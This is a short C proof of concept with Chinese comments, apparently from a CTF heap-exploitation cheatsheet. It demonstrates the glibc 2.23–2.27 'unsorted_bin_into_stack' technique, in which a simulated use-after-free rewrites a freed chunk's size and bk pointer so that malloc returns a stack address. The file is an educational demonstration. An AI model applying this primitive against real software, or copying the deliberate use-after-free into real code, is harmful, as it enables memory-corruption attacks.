/*
 * 中文导读（CTF 版）
 *
 * 手法：unsorted_bin_into_stack
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：UAF 改写 unsorted chunk 的 bk，并在目标附近布置伪造 size。
 * 2.26/2.27 已有 tcache，request=0x410（物理 size=0x420）可直接绕过它。
 * 核心流程：让 unsorted 链把栈上 fake chunk 当候选，再以匹配大小的请求取出。
 * 成功判据：malloc 返回栈地址；2.28 的 unsorted bck->fd 检查使本 PoC 失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};

	intptr_t* victim = malloc(0x410);

	intptr_t* p1 = malloc(0x410);

	free(victim);

	stack_buffer[1] = 0x410 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	// ---------------- 漏洞模拟开始：覆盖 victim 的 size 与 bk 字段。 ----------------
	victim[-1] = 32;
	victim[1] = (intptr_t)stack_buffer; // 令 victim->bk 指向栈上的伪 chunk，使下一次分配沿伪链返回栈地址。
	//------------------------------------

	char *p2 = malloc(0x410);

	/*
	 * 上游旧示例继续覆盖 main 的返回地址来模拟“跳 shellcode”。那会让成功
	 * 与编译器栈布局绑定，而且破坏后的 unsorted 链可能在 exit 刷新 stdio 时
	 * 再次触发 malloc。cheatsheet 只验证 bin 原语本身：本次 malloc 确实返回
	 * fake chunk 的 user area。之后用 _Exit 避免退出清理误消费故意损坏的链。
	 */
	assert(p2 == (char *)&stack_buffer[2]);
	puts("[+] unsorted：栈伪块命中");
	_Exit(0);
}
